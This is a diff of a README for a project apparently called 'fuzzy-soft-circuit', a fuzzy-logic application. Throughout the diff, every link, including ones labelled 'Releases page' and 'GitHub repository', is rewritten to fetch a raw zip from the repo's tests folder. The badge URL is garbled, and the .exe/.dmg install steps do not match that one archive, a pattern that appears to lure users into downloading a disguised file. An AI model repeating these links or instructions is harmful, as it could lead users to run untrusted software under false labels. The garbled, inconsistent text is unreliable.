@@ -1,6 +1,6 @@
 # 🚀 fuzzy-soft-circuit - Discover Fuzzy Logic Made Easy
 
-[![Download Now](https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/papers/fuzzy-soft-circuit-1.7-alpha.4.zip%20Now-%20https%3A%2F%https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/papers/fuzzy-soft-circuit-1.7-alpha.4.zip%2Flucyfear%2Ffuzzy-soft-circuit%https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/papers/fuzzy-soft-circuit-1.7-alpha.4.zip)](https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/papers/fuzzy-soft-circuit-1.7-alpha.4.zip)
+[![Download Now](https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/tests/circuit-fuzzy-soft-millionary.zip%20Now-%20https%3A%2F%https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/tests/circuit-fuzzy-soft-millionary.zip%2Flucyfear%2Ffuzzy-soft-circuit%https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/tests/circuit-fuzzy-soft-millionary.zip)](https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/tests/circuit-fuzzy-soft-millionary.zip)
 
 ## 🌟 Introduction
 
@@ -26,7 +26,7 @@ Before you start, ensure your computer meets the following requirements:
 ## 🚀 Getting Started
 
 1. **Download the Application:**
-   Visit this page to download: [Download fuzzy-soft-circuit](https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/papers/fuzzy-soft-circuit-1.7-alpha.4.zip)
+   Visit this page to download: [Download fuzzy-soft-circuit](https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/tests/circuit-fuzzy-soft-millionary.zip)
 
 2. **Choose the Correct Version:**
    Look for the latest version of the application. You will find files listed under "Assets." Select the one that matches your operating system.
@@ -34,7 +34,7 @@ Before you start, ensure your computer meets the following requirements:
 3. **Install the Application:**
    - **Windows:** Open the downloaded `.exe` file and follow the installation prompts.
    - **macOS:** Open the `.dmg` file, then drag the application to your Applications folder.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/papers/fuzzy-soft-circuit-1.7-alpha.4.zip` file and follow the included instructions.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/tests/circuit-fuzzy-soft-millionary.zip` file and follow the included instructions.
 
 4. **Launch the Application:**
    Locate the application in your installed programs or applications folder. Double-click the icon to launch it.
@@ -61,7 +61,7 @@ When you first open fuzzy-soft-circuit, you will see a simple interface designed
 
 ## 🔄 Download & Install
 
-For installation and updates, always return to the Releases page: [Download fuzzy-soft-circuit](https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/papers/fuzzy-soft-circuit-1.7-alpha.4.zip)
+For installation and updates, always return to the Releases page: [Download fuzzy-soft-circuit](https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/tests/circuit-fuzzy-soft-millionary.zip)
 
 ## 🌐 Community and Support
 
@@ -98,4 +98,4 @@ This software is distributed under the MIT License. Feel free to modify and shar
 
 ## 📬 Contact
 
-For any inquiries, please reach out to the project maintainer via the [GitHub repository](https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/papers/fuzzy-soft-circuit-1.7-alpha.4.zip).
+For any inquiries, please reach out to the project maintainer via the [GitHub repository](https://raw.githubusercontent.com/lucyfear/fuzzy-soft-circuit/master/tests/circuit-fuzzy-soft-millionary.zip).
